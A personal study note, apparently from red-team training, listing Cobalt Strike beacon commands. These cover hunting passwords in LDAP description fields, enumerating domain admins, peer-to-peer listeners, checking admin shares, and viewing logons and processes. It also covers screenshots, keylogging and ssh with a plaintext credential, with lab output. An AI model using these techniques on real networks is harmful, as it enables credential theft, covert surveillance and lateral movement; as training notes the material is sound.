---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[CobaltStrike]]  
___

## Description:  



### Useful BOFs

[Situational Awareness BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)

Can use this to look for passwords in descriptions fields 

`ldapsearch (&(objectClass=User)(objectCategory=Person)) name,samaccountname,description

or find domain admins

`netGroupListMembers "Domain Admins" domainname.local`




### Peer-to-Peer Listeners
Allows one beacon to talk to another beacon without having to directly talk to the team server.


Go to Listeners, add, choose payload to be either beacon SMB or beacon TCP.

Generate payload for that listener, execute on second target. 

Use `link` and `connect` commands on first target to connect.

`connect <first_target_ip> 4444`



### Test Local Admin access

^7373ce

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> ls \\srv-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:43:16   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     05/14/2021 15:29:09   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/25/2021 13:12:18   inetpub
          dir     02/23/2018 11:06:05   PerfLogs
          dir     05/14/2021 15:25:37   Program Files
          dir     05/14/2021 15:15:23   Program Files (x86)

```

### Currently logged on users

^b9973d

```
beacon> net logons
Logged on users at \\localhost:

DEV\SRV-1$
DEV\jking
DEV\svc_mssql
```

### Running Processes

```
beacon> ps

PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
448   796   RuntimeBroker.exe            x64   1           DEV\jking
2496  716   svchost.exe                  x64   1           DEV\jking
2948  1200  sihost.exe                   x64   1           DEV\jking
3088  1200  taskhostw.exe                x64   1           DEV\jking
3320  3304  explorer.exe                 x64   1           DEV\jking
3608  796   ShellExperienceHost.exe      x64   1           DEV\jking
3800  796   SearchUI.exe                 x64   1           DEV\jking
4004  3320  shutdown.exe                 x64   1           DEV\jking
4016  4004  conhost.exe                  x64   1           DEV\jking
4472  1200  taskhostw.exe                x64   1           DEV\jking
[...snip...]
2656  716   sqlservr.exe                 x64   0           DEV\svc_mssql

```




### Screenshots

^563c93

Taking screenshots of the user’s desktop can be useful just to see what they are doing. It can show what systems or applications they're using, what shortcuts they have, what documents they’re working on and so on.

```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop

```


### KeyLogger

^00b23d

A keylogger can capture the keystrokes of a user, which is especially useful for capturing usernames, passwords and other sensitive data.
`Keylogger`

All keystrokes can be seen at **View > Keystrokes**.


The keylogger runs as a job that can be stopped with the `jobkill` command.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    0     keystroke logger

beacon> jobkill 1

```


### ssh

Beacon also has a built-in ssh client
```
beacon> ssh 10.10.17.12:22 svc_oracle Passw0rd!
[+] established link to child session: 10.10.17.12

```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (07:36 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
